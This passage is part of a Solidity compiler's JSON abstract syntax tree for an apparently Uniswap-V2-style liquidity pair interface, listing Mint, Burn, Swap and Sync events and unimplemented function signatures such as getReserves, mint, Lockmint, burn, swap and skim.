													"typeString": "uint256"
												},
												"typeName": {
													"id": 706,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1247:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 709,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1270:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 708,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1270:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 711,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1296:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 710,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1296:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 713,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1313:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 712,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1313:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 715,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1332:9:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 714,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1332:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1189:158:4"
									},
									"returnParameters": {
										"id": 717,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1356:0:4"
									},
									"scope": 852,
									"src": "1174:183:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 726,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 725,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 720,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1374:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 719,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1374:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 722,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1398:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 721,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1398:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 724,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 726,
												"src": "1415:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 723,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1415:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1373:58:4"
									},
									"src": "1363:69:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 736,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 735,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 728,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1457:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 727,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1457:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 730,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1489:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 729,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1489:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 732,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1514:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 731,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1514:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 734,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 736,
												"src": "1539:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 733,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1539:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1447:116:4"
									},
									"src": "1437:127:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 750,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 749,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 738,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1589:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 737,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1589:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 740,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1621:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 739,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1621:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 742,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1648:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 741,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1648:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 744,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1675:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 743,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1675:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 746,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1703:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 745,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1703:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 748,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 750,
												"src": "1731:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 747,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1731:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1579:176:4"
									},
									"src": "1569:187:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 756,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 755,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 752,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 756,
												"src": "1772:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 751,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1772:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 754,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 756,
												"src": "1790:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 753,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1790:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1771:36:4"
									},
									"src": "1761:47:4"
								},
								{
									"body": null,
									"documentation": null,
									"id": 761,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 757,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1840:2:4"
									},
									"returnParameters": {
										"id": 760,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 759,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 761,
												"src": "1866:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 758,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1866:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1865:9:4"
									},
									"scope": 852,
									"src": "1814:61:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 766,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 762,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1897:2:4"
									},
									"returnParameters": {
										"id": 765,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 764,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 766,
												"src": "1923:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 763,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1923:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1922:9:4"
									},
									"scope": 852,
									"src": "1881:51:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 771,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 767,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1953:2:4"
									},
									"returnParameters": {
										"id": 770,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 769,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "1979:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 768,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1979:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1978:9:4"
									},
									"scope": 852,
									"src": "1938:50:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 776,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 772,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2009:2:4"
									},
									"returnParameters": {
										"id": 775,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 774,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 776,
												"src": "2035:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 773,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2035:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2034:9:4"
									},
									"scope": 852,
									"src": "1994:50:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 785,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 777,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2070:2:4"
									},
									"returnParameters": {
										"id": 784,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 779,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2120:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 778,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2120:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 781,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2138:16:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 780,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2138:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 783,
												"name": "blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 785,
												"src": "2156:25:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 782,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2156:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2119:63:4"
									},
									"scope": 852,
									"src": "2050:133:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 790,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price0CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 786,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2218:2:4"
									},
									"returnParameters": {
										"id": 789,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 788,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 790,
												"src": "2244:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 787,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2244:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2243:9:4"
									},
									"scope": 852,
									"src": "2189:64:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 795,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "price1CumulativeLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 791,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2288:2:4"
									},
									"returnParameters": {
										"id": 794,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 793,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 795,
												"src": "2314:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 792,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2314:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2313:9:4"
									},
									"scope": 852,
									"src": "2259:64:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 800,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "kLast",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 796,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2343:2:4"
									},
									"returnParameters": {
										"id": 799,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 798,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 800,
												"src": "2369:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 797,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2369:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2368:9:4"
									},
									"scope": 852,
									"src": "2329:49:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 807,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 803,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 802,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 807,
												"src": "2398:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 801,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2398:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2397:12:4"
									},
									"returnParameters": {
										"id": 806,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 805,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 807,
												"src": "2428:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 804,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2428:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2427:19:4"
									},
									"scope": 852,
									"src": "2384:63:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 814,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "Lockmint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 810,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 809,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 814,
												"src": "2471:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 808,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2471:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2470:12:4"
									},
									"returnParameters": {
										"id": 813,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 812,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 814,
												"src": "2501:17:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 811,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2501:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2500:19:4"
									},
									"scope": 852,
									"src": "2453:67:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 823,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 817,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 816,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2559:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 815,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2559:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2549:26:4"
									},
									"returnParameters": {
										"id": 822,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 819,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2594:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 818,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2594:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 821,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 823,
												"src": "2611:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 820,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2611:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2593:34:4"
									},
									"scope": 852,
									"src": "2536:92:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 834,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 832,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 825,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2657:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 824,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2657:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 827,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2685:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 826,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2685:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 829,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2713:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 828,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2713:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 831,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "2733:19:4",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 830,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "2733:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2647:111:4"
									},
									"returnParameters": {
										"id": 833,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2767:0:4"
									},
									"scope": 852,
									"src": "2634:134:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 839,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "skim",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 837,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 836,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 839,
												"src": "2788:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 835,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2788:7:4",
